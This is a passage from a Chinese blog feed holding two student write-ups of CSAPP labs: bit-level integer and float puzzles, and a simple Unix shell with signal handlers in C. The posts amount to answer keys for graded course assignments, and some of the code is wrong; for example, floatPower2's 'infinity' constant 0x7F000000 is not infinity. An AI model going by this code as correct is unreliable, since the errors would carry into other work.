<h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>return the minimum number of bits required to represent x in   two’s complement    返回用二进制补码表示x的最小位数，比如1、0只用一位即可表示</p>
<p>-1也是1，因为-1的补码是1111 1111其实等价于1，补码101和1101代表的都是-3，所以-3最少需要三位，补码的最高位是符号位，就像非负数01和001、0001代表的都是1，前面有多少0都无关紧要，对于负数的补码，前面有多少个1都无关紧要，用数学来解释的话就是最高的两位之和是个定值，对于101最高两位是-2&#x3D;-2，对于1101最高两位是-4+2&#x3D;-2。</p>
<p>负数以补码的形式储存，正数的原码补码反码相同。思路：如果是整数那就检索其最高位的1的位置，如果1首先出现在了第三位，比如0101，最高位的1所在的位置就是3，那么这个数最少就可以用3+1位来表示,加的那个1是符号位。对于负数，我们检索其最高位0出现的位置，11101，0出现在第2位，那么最少可以用2+1（符号位）来表示此数，对于-1也就是全1，可以用1表示，仍然符合，也就是它的第0位是0然后我们加上1。</p>
<p>那么怎么检索呢？一个一个来肯定是不能满足操作符数量上的要求的。可以用二分法，我们处理的int是32位的，我们可以先检测它的前十六位，比如说如果全部位0，那么肯定可以用16及更少的位来表示它，再检测其余十六位的前八位，如果不全为零，那么我们继续缩小范围，检测前八位的前四位……</p>
<p>具体怎么实现还是参考的网上的，两个主要操作：计数和缩小范围</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> </span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> a0,a1,a2,a4,a8,a16;</span><br><span class="line">   <span class="type">int</span> w;<span class="comment">//位数</span></span><br><span class="line">   <span class="type">int</span> sign=x&gt;&gt;<span class="number">31</span>;<span class="comment">//如果是正数返回全0，如果是负数返回全1</span></span><br><span class="line">   x=(~sign&amp;x)|(sign&amp;~x);<span class="comment">//如果是非负数则返回x，如果是负数则按位取反</span></span><br><span class="line">   a16=(!!(x&gt;&gt;<span class="number">16</span>))&lt;&lt;<span class="number">4</span>;<span class="comment">//右移16位，两次取非，左移4；如果如果没出现1则高16位为0则返回0，如果出现1则非零则返回16</span></span><br><span class="line">   x=x&gt;&gt;a16;<span class="comment">//如果高十六位非零，右移16位；</span></span><br><span class="line">   a8=(!!(x&gt;&gt;<span class="number">8</span>))&lt;&lt;<span class="number">3</span>;<span class="comment">//如果前十六位为0，则检测其前24位，如果无1，则返回0，如果出现1，则返回8；如果前十六位不为0，则检测32~25位，如果为0则返回0，否则返回8</span></span><br><span class="line">   x=x&gt;&gt;a8;<span class="comment">//如果a8非零则右移8位；</span></span><br><span class="line">   a4=(!!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>);<span class="comment">//如果前8位为零的话，检测其前28位；如果前8位不为为零的话，这一步检测其前四位（32~29位），如果非零则返回4，为零返回0；</span></span><br><span class="line">   x=x&gt;&gt;a4;</span><br><span class="line">   a2=!!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;<span class="comment">//如果24位为零的话，则只检测其前30位，为零则返回0，出现1则返回2；</span></span><br><span class="line">   x=x&gt;&gt;a2;<span class="comment">//如果a2非零则右移四位</span></span><br><span class="line">   a1=!!(x&gt;&gt;<span class="number">1</span>);<span class="comment">//如果前30位为零的话，则检测其前31位。</span></span><br><span class="line">   x=x&gt;&gt;a1;<span class="comment">//如果a1非零则右移两位</span></span><br><span class="line">   a0=x;<span class="comment">//如果前31位为零，那么x要么是1，要么是0</span></span><br><span class="line">   w=a0+a1+a2+a4+a8+a16+<span class="number">1</span>;</span><br><span class="line">   <span class="keyword">return</span> w;<span class="comment">//1是符号位</span></span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><p>float型 符号 阶码 尾数位分别为 1、8、23，</p>
<p>规格化的，尾数以隐含的1开头，E&#x3D;e-bias</p>
<p>非规格化的，尾数无隐含的1，E&#x3D;1-bias</p>
<p><img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230328115316.png"></p>
<h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>Return bit-level equivalent of expression 2*f for floating point argument f.将传来的参数当成float的位级表示，返回浮点数乘2的位级表示，如果是NAN和极大值(阶码全部为1)则返回0x800000(1000 0000)</p>
<p>思路：对于规格话数，乘2只需要将阶码+1，其它位保持不变</p>
<p> 非规格化的数左移一位即可得到2倍，原因见下图。参考：<a href="https://blog.csdn.net/qq_43855740/article/details/106843924">https://blog.csdn.net/qq_43855740/article/details/106843924</a></p>
<p><img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230328140534.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;   <span class="comment">//拿1来举例子0    0000 0000    0000 0000 0000 0000 0000 001</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> s=((uf&gt;&gt;<span class="number">31</span>)&lt;&lt;<span class="number">31</span>);<span class="comment">//符号            0    0000 0000    0000 0000 0000 0000 0000 000 </span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> e=((uf&gt;&gt;<span class="number">23</span>)&lt;&lt;<span class="number">24</span>&gt;&gt;<span class="number">1</span>);<span class="comment">//获得阶码     0    0000 0000    0000 0000 0000 0000 0000 000</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> m=((uf&lt;&lt;<span class="number">9</span>)&gt;&gt;<span class="number">9</span>);<span class="comment">//获得尾数           0    0000 0000    0000 0000 0000 0000 0000 001</span></span><br><span class="line">  <span class="keyword">if</span>(e==<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> (uf&lt;&lt;<span class="number">1</span>)|s;<span class="comment">//非规格化数左移1位变为两倍，再恢复其符号位</span></span><br><span class="line">  <span class="keyword">if</span>(e==<span class="number">0x7f800000</span>)<span class="comment">//无穷大和非规格化数 无穷大的二倍还是无穷大</span></span><br><span class="line">   <span class="keyword">return</span> uf;</span><br><span class="line">  e=(((uf&gt;&gt;<span class="number">23</span>)+<span class="number">1</span>)&lt;&lt;<span class="number">24</span>&gt;&gt;<span class="number">1</span>);<span class="comment">//获得阶码+1 </span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> r=s+e+m;</span><br><span class="line">  <span class="keyword">return</span> r;                     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><p>Return bit-level equivalent of expression (int) f  for floating point argument f.将浮点型转换为位级等价整数 Anything out of range (including NaN and infinity) should return 0x80000000u.</p>
<p>取出他的符号 指数和尾数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s=uf&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>;<span class="comment">//取符号</span></span><br><span class="line">     <span class="type">int</span> e=(uf&lt;&lt;<span class="number">1</span>&gt;&gt;<span class="number">24</span>)<span class="number">-127</span>;<span class="comment">//e属于(-127~126)</span></span><br><span class="line">     <span class="type">int</span> m=uf&lt;&lt;<span class="number">9</span>&gt;&gt;<span class="number">9</span>;<span class="comment">//尾数</span></span><br><span class="line">     m=m+<span class="number">0x800000</span>;</span><br><span class="line">     <span class="type">int</span> r=<span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">if</span>(e&lt;<span class="number">0</span>)<span class="comment">//小数点左移，实际的数就是0.xxx</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(e&gt;<span class="number">31</span>)<span class="comment">//溢出，包括NaN</span></span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    <span class="keyword">if</span>(e&gt;<span class="number">23</span>)</span><br><span class="line">        m=(m&lt;&lt;(e<span class="number">-23</span>));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        m=(m&gt;&gt;(<span class="number">23</span>-e));</span><br><span class="line">    <span class="type">int</span> mSign=m&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(s)<span class="comment">//如果传来的参数是负数，那么我们直接将得到的数取反</span></span><br><span class="line">      <span class="keyword">return</span> -m;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//传参为正数</span></span><br><span class="line">      <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><p>Return bit-level equivalent of the expression 2.0^x  (2.0 raised to the power x) for any 32-bit integer x.以浮点数形式返回2^x&#x3D;r</p>
<p>2的多少次方，其尾数全零，隐含1，我们只需要将e改为127+x即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> e=x+<span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(e&lt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(e&gt;=<span class="number">255</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x7F000000</span>u;<span class="comment">//返回+INF（正无穷大）</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> (e&lt;&lt;<span class="number">23</span>)|<span class="number">0</span>;</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230328212413.png"></p>
<p>完结撒花</p>
]]></content>
      <tags>
        <tag>lab</tag>
      </tags>
  </entry>
  <entry>
    <title>csapp-shlab</title>
    <url>/2023/09/19/csapp-shlab/</url>
    <content><![CDATA[<p>实现一个简单的shell，光是看官方的pdf就看了半天。</p>
<p>其实很简单，我们只要完善七个函数就好了，其中三个信号相关的。每次更新我们都要使用make命令编译一下。<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230919172643.png"></p>
<p>这样就完成了更新。</p>
<p>一共有七个任务：</p>
<span id="more"></span>

<ul>
<li>eval: Main routine that parses and interprets the command line. [70 lines]</li>
<li>builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines]</li>
<li>do bgfg: Implements the bg and fg built-in commands. [50 lines]</li>
<li>waitfg: Waits for a foreground job to complete. [20 lines]</li>
<li>sigchld handler: Catches SIGCHILD signals. 80 lines]</li>
<li>sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines]</li>
<li>sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]</li>
</ul>
<p>中文解释：</p>
<ul>
<li>解析和解释命令行的main程序。[70行]</li>
<li>内置命令：识别和解释内置命令：quit、fg、bg和jobs。[25行]</li>
<li>执行bgfg：实现bg和fg内置命令。[50行]</li>
<li>等待前台作业完成：等待前台作业完成。[20行]</li>
<li>SIGCHLD处理程序：捕获SIGCHILD信号。[80行]</li>
<li>SIGINT处理程序：捕获SIGINT（ctrl-c）信号。[15行]</li>
<li>SIGTSTP处理程序：捕获SIGTSTP（ctrl-z）信号。[15行]</li>
</ul>
<p>中括号里的行数是预期函数代码。</p>
<h2 id="信号处理函数"><a href="#信号处理函数" class="headerlink" title="信号处理函数"></a><strong>信号处理函数</strong></h2><p>正如书中所说信号处理是linux系统编程中最棘手的一个问题。</p>
<p>如何安全的进行信号处理？</p>
<ul>
<li>处理程序尽可能简单</li>
<li>在处理程序中只调用异步信号安全的函数。</li>
<li>保存和恢复errno。许多Linux异步信号处理程序都会在出错返回时设置errno。在处理程序运行时可能会干扰主程序中其他依赖于errno的部分。解决方法是在进入处理程序时将errno保存到一个局部变量，在处理函数返回前恢复它。如果处理程序用_exit终止该程序，那么就不需要这样做。</li>
<li>阻塞所有的信号，保护对共享全局数据结构的访问。如果处理程序和主程序或其他处理程序共享一个全局数据结构，那么在访问该数据结构时，处理程序和主程序应该暂时阻塞所有的信号。这条规则的原因是从主程序访问一个数据结构d通常需要一系列指令，如果指令序列被访问d的处理程序中断，那么处理程序可能会发现d的状态不一致，得到不可预知的结果。在访问d时暂时阻塞信号保证了处理程序不会中断该指令序列。</li>
</ul>
<h3 id="sigint-handler（✔）"><a href="#sigint-handler（✔）" class="headerlink" title="sigint_handler（✔）"></a><strong>sigint_handler（✔）</strong></h3><p>先来个行数最小的，捕获SIGINT，也就是令cltr-c得到处理。有两点需要注意：1）这个程序不是被_exit终止的，所以我们最好设置一下errno。2）处理程序访问了全局数据jobs，安全起见我们暂时阻塞所有信号。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tmp=errno;</span><br><span class="line">    <span class="type">sigset_t</span> <span class="built_in">set</span>,prev_set;</span><br><span class="line">    sigfillset(&amp;<span class="built_in">set</span>);<span class="comment">//将全部信号加入set</span></span><br><span class="line">    sigprocmask(SIG_BLOCK,&amp;<span class="built_in">set</span>,&amp;prev_set);<span class="comment">//阻塞全部信号</span></span><br><span class="line">    <span class="comment">//printf(&quot;494:阻塞全部信号\n&quot;);</span></span><br><span class="line">    <span class="type">pid_t</span> pid=fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(pid&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;got SIGINT&quot;);</span></span><br><span class="line">        kill(-pid,SIGINT);<span class="comment">//-pid kill函数发送信号给|pid|进程组的每个进程，起到了将所有的子进程父进程孙进程一网打尽的效果</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;501:恢复全部信号\n&quot;);</span></span><br><span class="line">    sigprocmask(SIG_SETMASK,&amp;prev_set,<span class="literal">NULL</span>);<span class="comment">//恢复</span></span><br><span class="line">    errno=tmp;</span><br><span class="line">    <span class="comment">//printf(&quot;成功退出SIGCHLD处理函数\n&quot;);</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要注意的点就是kill函数第一个参数设置为负数，可以对整个进程组发送信号，防止产生孤儿进程。</p>
<h3 id="sigtstp-handler（✔）"><a href="#sigtstp-handler（✔）" class="headerlink" title="sigtstp_handler（✔）"></a><strong>sigtstp_handler（✔）</strong></h3><p>SIGSTOP属于不可忽略信号，作用是暂停前台作业。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tmp=errno;</span><br><span class="line"></span><br><span class="line">    <span class="type">sigset_t</span> <span class="built_in">set</span>,prev_all;</span><br><span class="line">    sigfillset(&amp;<span class="built_in">set</span>);<span class="comment">//将全部信号加入set</span></span><br><span class="line">    sigemptyset(&amp;prev_all);</span><br><span class="line">    sigprocmask(SIG_BLOCK,&amp;<span class="built_in">set</span>,&amp;prev_all);<span class="comment">//阻塞全部信号</span></span><br><span class="line">    <span class="type">pid_t</span> pid=fgpid(jobs);<span class="comment">//有前台则返回pid，无则返回0</span></span><br><span class="line">    <span class="keyword">if</span>(pid&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        kill(-pid,sig);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);<span class="comment">//恢复</span></span><br><span class="line">    errno=tmp;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sigchld-handler（✔）"><a href="#sigchld-handler（✔）" class="headerlink" title="sigchld_handler（✔）"></a><strong>sigchld_handler</strong>（✔）</h3><p>子进程终止或停止操作系统会向父进程发出SIGCHLD信号。</p>
<p>先看书中的几个例子。首先是这个例子，调用waitpid并将第一个参数设置为-1，等待集合由父进程的所有子进程组成。</p>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230914153737.png"></p>
<p>在只有单一进程的情况下，这种处理方法是没有问题的，可是如果子进程有很多，就会出现丢失信号的情况。因为等待列表里最多只能有一个信号，当接收到SIGCHLD信号的时候，调用处理程序，SIGCHLD信号被阻塞，如果此时传来一个SIGCHLD信号他就会进入等待列表，等第一个信号处理完之后，解除阻塞，触发处理程序，一旦这时候在传来SIGCHLD信号，信号不会进入列表等待，而是直接丢失。要解决这个问题，我们就得明白信号是不会排队等待的。</p>
<p>下面是解决信号不排队等待问题的方案，设置了一个循环，waitpid函数如果成功等待进程停止就会返回pid&gt;0，进入循环后阻塞全部的信号，删除作业，解除阻塞。</p>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230914022659.png"></p>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230914022754.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tmp=errno;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="type">sigset_t</span> mask_all,prev;</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigemptyset(&amp;prev);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>((pid=waitpid(<span class="number">-1</span>,&amp;status,WNOHANG | WUNTRACED))&gt;<span class="number">0</span>)  <span class="comment">//第三个参数代表立即返回，如果等待集合的子进程都没有被停职或终止则返回0，如果有则返回pid</span></span><br><span class="line">    &#123;  <span class="comment">//有子进程停止或终止，判断是停止则更改状态，是终止则删除作业</span></span><br><span class="line">       sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);<span class="comment">//阻塞全部信号</span></span><br><span class="line">       <span class="keyword">if</span>(WIFEXITED(status))</span><br><span class="line">       &#123; <span class="comment">//如果进程是通过exit或return正常终止则返回真，进入语句</span></span><br><span class="line">         deletejob(jobs,pid);<span class="comment">//删除指定pid的作业，pid由waitpid返回得到</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(WIFSIGNALED(status))</span><br><span class="line">       &#123; <span class="comment">//如果子进程是因为一个信号终止的则返回真</span></span><br><span class="line">         <span class="built_in">printf</span> (<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(status));</span><br><span class="line">         deletejob(jobs, pid);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(WIFSTOPPED(status))</span><br><span class="line">       &#123; <span class="comment">//如果子进程现在是停止的，改变工作状态--&gt;ST</span></span><br><span class="line">           <span class="built_in">printf</span> (<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, pid2jid(pid), pid, WSTOPSIG(status));</span><br><span class="line">           job = getjobpid(jobs,pid);</span><br><span class="line">           job-&gt;state = ST;</span><br><span class="line">       &#125;</span><br><span class="line">       sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if(errno!=ECHILD)</span></span><br><span class="line">    <span class="comment">//   unix_error(&quot;waitpid error!&quot;);</span></span><br><span class="line">    errno=tmp;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意waitpid的参数设置，这里不再是默认的,而是使用了status和options，status记录进程状态信息，options更改等待子进程的行为。默认情况options是0，等待集合中的任意一个子进程结束，如果集合中有后台进程，那么waitpid函数也会傻傻的等待，直到后台进程执行完毕才会重新弹出&gt;,所以这里设置了参数WNOHANG | WUNTRACED，此时waitpid的行为是立即返回，即不会等待进程停止或结束。</p>
<h2 id="输入处理函数"><a href="#输入处理函数" class="headerlink" title="输入处理函数"></a><strong>输入处理函数</strong></h2><h3 id="eval函数（✔）"><a href="#eval函数（✔）" class="headerlink" title="eval函数（✔）"></a><strong>eval函数</strong>（✔）</h3><p>先看一下书上的作为参考<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230912012344.png"></p>
<p>eval函数在main函数中的调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Execute the shell&#x27;s read/eval loop */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Read command line */</span></span><br><span class="line">    <span class="keyword">if</span> (emit_prompt) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &amp;&amp; ferror(<span class="built_in">stdin</span>))</span><br><span class="line">        app_error(<span class="string">&quot;fgets error&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (feof(<span class="built_in">stdin</span>)) &#123; <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Evaluate the command line */</span></span><br><span class="line">    eval(cmdline);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure>

<p>功能：首先检测第一个命令行参数是否为shll的内置命令（）&#x2F;</p>
<p>参数是commandline也就是我们的输入</p>
<p>函数功能：</p>
<p>接收我们的输入作为参数，如果是内置命令则直接执行，如果不是内置命令，创建一个新的进程调用execve运行程序。</p>
<p>在标准的Unix shell运行shell时，shell在前台进程组中运行，所以我们用fork创建的子进程也就是我们的前台作业也属于shell的进程组。但是ctrl+c会向前台进程组的每个进程发送SIGINT信号，也就是内核会向shell和shell创建的每个进程，我们使用setpid(0,0),将创建的子进程放到一个引得进程组中，新的进程组ID和PID相同。这样当按下ctrl+c时就只会对shell发送信号</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span>*cmdline)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>*argv[MAXARGS];</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="type">int</span> bg;</span><br><span class="line">    <span class="type">sigset_t</span> mask,prev,mask_all;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    </span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigemptyset(&amp;prev);</span><br><span class="line">    sigaddset(&amp;mask,SIGCHLD);</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(buf,cmdline);<span class="comment">//将输入复制到buf</span></span><br><span class="line">    bg=parseline(buf,argv);<span class="comment">//构造参数列表，后台作业返回1，前台返回0</span></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//非内置命令</span></span><br><span class="line">        sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev);<span class="comment">//阻塞SIGCHLD信号</span></span><br><span class="line">        <span class="comment">//printf(&quot;194:阻塞SIGCHLD信号\n&quot;);//为什么要阻塞sigchld信号？防止子进程结束发出的sigchld信号影响主程序，也就是保证add在delete之前</span></span><br><span class="line">        <span class="keyword">if</span>((pid=fork())==<span class="number">0</span>)<span class="comment">//子进程运行命令,需要阻塞信号避免竞争</span></span><br><span class="line">        &#123;</span><br><span class="line">            setpgid(<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//将子进程放入新的进程组中gpid=pid，可以避免停止时把tsh程序中断</span></span><br><span class="line">            sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);<span class="comment">//恢复子进程信号</span></span><br><span class="line">            <span class="keyword">if</span>(execve(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s:command not found\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">//退出子进程</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//父进程,根据前后台添加作业至作业列表</span></span><br><span class="line">        <span class="comment">//printf(&quot;父进程控制&quot;);</span></span><br><span class="line">        <span class="keyword">if</span>(!bg)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;执行了一个前台任务&quot;);</span></span><br><span class="line">            sigprocmask(SIG_BLOCK,&amp;mask_all,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">//printf(&quot;213:阻塞全部信号\n&quot;);</span></span><br><span class="line">            <span class="comment">//printf(&quot;添加前台作业子进程的pid:%d,gpid:%d\n&quot;,pid,getpgid(pid));</span></span><br><span class="line">            addjob(jobs,pid,FG,cmdline);</span><br><span class="line">            waitfg(pid);</span><br><span class="line">            sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//后台作业</span></span><br><span class="line">        &#123;</span><br><span class="line">            sigprocmask(SIG_BLOCK,&amp;mask_all,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">//printf(&quot;225:阻塞全部信号\n&quot;);</span></span><br><span class="line">            <span class="comment">//printf(&quot;添加后台作业：%d\n&quot;,pid);</span></span><br><span class="line">            addjob(jobs,pid,BG,cmdline);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">            sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里比较关键的是<code>setpgid(0,0)</code>，当使用了execve函数开始一个新的进程时，按下ctrl+c不会将我们的tsh程序关闭，因为该函数将新的进程放入了一个新的进程组中，通过键盘发送的信号被tsh进程捕获然后通过kill函数像子进程组发送SIGINT信号就好啦。</p>
<h3 id="builtun-cmd（✔）"><a href="#builtun-cmd（✔）" class="headerlink" title="builtun_cmd（✔）"></a><strong>builtun_cmd（✔）</strong></h3><p>如果是内置命令（quit、fg、bg、jobs）则直接执行，如果不是则返回0。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;quit&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">//退出shell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;fg&quot;</span>)||(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;bg&quot;</span>)))<span class="comment">//fg %jid or fg pid 将一个作业切换至前台运行</span></span><br><span class="line">    &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;jobs&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;&amp;&quot;</span>))<span class="comment">//后台作业</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    